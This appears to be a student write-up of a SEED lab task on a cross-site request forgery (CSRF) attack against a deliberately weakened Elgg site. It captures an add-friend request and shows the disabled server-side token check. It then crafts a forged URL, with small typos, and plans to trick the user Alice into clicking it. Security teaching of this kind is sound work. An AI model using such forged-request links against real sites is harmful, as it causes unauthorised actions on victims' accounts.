### Task1: CSRF Attack using GET Request

**Part 1: Investigation**

Using the Firefox-tool **LiveHTTPHeaders**, Boby is able to get the URL for adding a friend.

```http
GET /action/friends/add?friend=39&__elgg_ts=1508757630&__elgg_token=f35aa5585b7a4e749ae1fde51d98b33a HTTP/1.1	
```

The *__elgg_ts* and *__elgg_token* are part of a counter-measure for a **CSRF** attack. To make sure this countermeasure is not applied, we have to check to validation code server-side, which is located at:

```sh
/var/www/CSRF/elgg/engine/lib/actions.php	
```

Here we can look at the *action_gatekeeper* -function

```php
function action_gatekeeper($action) {

	//SEED:Modified to enable CSRF.
	//Comment the below return true statement to enable countermeasure.
	return true;

	if ($action === 'login') {
 ....       
```

 This confirms that the CSRF-protection is turned off. This means we can safely ignore the *__elgg_ts* and *__elgg_token*, for our URL. Since we want *Alice*(guid=39) to add Bob(guid=40), we have to change the *friend=39 -> friend=40*

```http
GET /action/friends/add?friend=40
// complete URL
http:/csrflabelgg.com/action/friends/add?friend40
```



**Part2: The attack**

Now we somehow have to get Alice to click on the link. Maybe we just send a message to Alice.